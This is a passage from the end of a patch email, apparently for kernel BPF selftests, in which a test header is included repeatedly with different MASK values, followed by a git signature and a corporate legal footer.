+#include "test_tc_bpf_pkt_ptr.h"
+#undef MASK
+
+#define MASK 32
+#include "test_tc_bpf_pkt_ptr.h"
+#undef MASK
+
+#define MASK 64
+#include "test_tc_bpf_pkt_ptr.h"
+#undef MASK
+
+#define MASK 128
+#include "test_tc_bpf_pkt_ptr.h"
+#undef MASK
-- 
2.30.2




Amazon Development Center Germany GmbH
Krausenstr. 38
10117 Berlin
Geschaeftsfuehrung: Christian Schlaeger, Jonathan Weiss
Eingetragen am Amtsgericht Charlottenburg unter HRB 149173 B
Sitz: Berlin
Ust-ID: DE 289 237 879



